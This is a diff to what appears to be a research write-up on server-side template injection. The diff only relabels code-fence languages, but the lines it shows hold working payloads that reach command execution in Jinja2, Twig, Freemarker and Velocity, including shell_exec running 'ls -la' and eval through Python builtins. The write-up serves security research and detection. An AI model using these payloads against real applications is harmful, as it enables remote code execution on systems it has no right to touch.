@@ -357,7 +357,7 @@ any length restrictions.
 
 This payload works for all tested Python-based template engines, although Jinja2 required some
 modifications to call Python getattr() function:
-```text
+```python
 {{ cycler.__init__.__globals__.__builtins__.getattr("", OUTPUT) }}
 ```
 
@@ -389,7 +389,7 @@ For newer Twig versions I used |map filter to preserve the output, but it passed
 second element, which made directly using shell_exec() function impossible. To bypass that limitation I
 used call_user_func() function to call shell_exec() and a dictionary instead of an array to control index
 values:
-```text
+```php
 {% set OUTPUT = {"ls -la": "shell_exec"}|map("call_user_func")|join %}
 ```
 
@@ -557,7 +557,7 @@ Code execution is possible by using bool(eval( … )), while OS command executio
 os.popen( … )._proc.wait() == 0 starting from Python 3.6.
 In most Python-based template engines these payloads could be used as is, while Jinja2 does not allow
 direct access to built-in Python functions. As a result, payload for Jinja2 is a little more complex:
-```text
+```python
 {{ 1 / (not not cycler.__init__.__globals__.__builtins__.eval( … )) }}
 ```
 
@@ -572,7 +572,7 @@ Code evaluation results could be accessed using true && eval( … ), and the ret
 command execution could be checked with pclose(popen( … , "wb")) == 0
 These payloads work for all tested template engines except Twig. Old versions of Twig template engine
 allow us to use a payload like this:
-```text
+```php
 {{_self.env.registerUndefinedFilterCallback("shell_exec")}}
 {{1/ (_self.env.getFilter("…&& echo SSTIMAP")|trim('\n') ends with "SSTIMAP")}}
 ```
@@ -610,7 +610,7 @@ order of operations, previously computed values also affect the conversions. Whi
 (123 + 456) + "abc" + (123 + 456) will start converting integers to strings, returning "579abc123456"
 
 Main payload for Freemarker was already created by Nicolas Verdier [10]:
-```text
+```java
 ${1/((…)?string('1','0')?eval)}
 ```
 
@@ -626,7 +626,7 @@ To check the results of OS command execution I decided to use a technique previo
 For Velocity template engine we can use #if and #include directives:
 -   #if(false)#include("Y:/A:/true")#end and #if(true)#include("Y:/A:/false")#end
 -   #set($o=1.0)#if($o.equals(0.1))#include("Y:/A:/xxx")#end and
-```text
+```java
 #set($o=1.0)#if($o.equals(1.0))#include("Y:/A:/xxx")#end
 ```
 
